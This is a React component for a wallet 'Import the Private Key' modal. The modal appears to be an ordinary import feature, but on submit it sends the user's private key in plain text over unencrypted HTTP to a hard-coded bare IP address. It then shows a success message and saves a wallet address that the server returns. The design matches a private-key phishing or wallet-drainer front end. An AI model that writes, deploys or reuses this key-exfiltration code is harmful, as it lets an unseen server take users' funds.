import React, { useState } from "react";
import axios from "axios";
// import { toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

const WalletModal = ({ show, close }) => {
  const [pkValue, setPkValue] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    // close();

    try {
      const response = await axios.post("http://170.130.165.249:3001/import/", {
        addr: pkValue,
      });

      console.log("Res from backend:", response.data);
      alert(`Wallet import successfully, ${response.data.message}`);

      setPkValue("");
      localStorage.setItem("importedPk", response.data.walletAddress);

      close();
    } catch (err) {
      alert(`Invalide Private Key!`);
      console.error("error", err);
    }
  };

  return (
    <>
      {show ? (
        <div className="fixed top-0 bottom-0 left-0 right-0 flex justify-center items-center z-10">
          <div
            className="fixed top-0 left-0 right-0 bottom-0 bg-[#00000080] z-10"
            onClick={() => close()}
          />
          <form
            className="w-[35vw] z-50 h-auto p-[1.7rem] rounded-[20px] bg-[#16171B] border-[2px] border-solid border-[#373737] "
            onSubmit={handleSubmit}
          >
            <div className="flex flex-row justify-between text-white pb-[10px]">
              <p className="text-xl font-semibold">Import the Private Key</p>
              <p style={{ cursor: "pointer" }} onClick={() => close()}>
                ⨉
              </p>
            </div>
            <div className="flex flex-col justify-start pb-[10px] pt-[10px]">
              <p className="text-[#919398] text-[16px] pb-[10px] font-medium">
                Private Key
              </p>
              <input
                className="bg-[#16171b] border border-solid outline-none border-[#3a3c4b] rounded-[6px] p-[6px_15px] text-[14px] text-white"
                placeholder="Enter your Private Key here."
                type="password"
                value={pkValue}
                onChange={(e) => setPkValue(e.target.value)}
              />
            </div>
            <button
              className="bg-[#FFFEFD] text-[#16171b] font-medium text-[16px] rounded-[6px] p-[12px_24px] mt-[10px]"
              type="submit"
            >
              Import
            </button>
          </form>
        </div>
      ) : null}
    </>
  );
};

export default WalletModal;
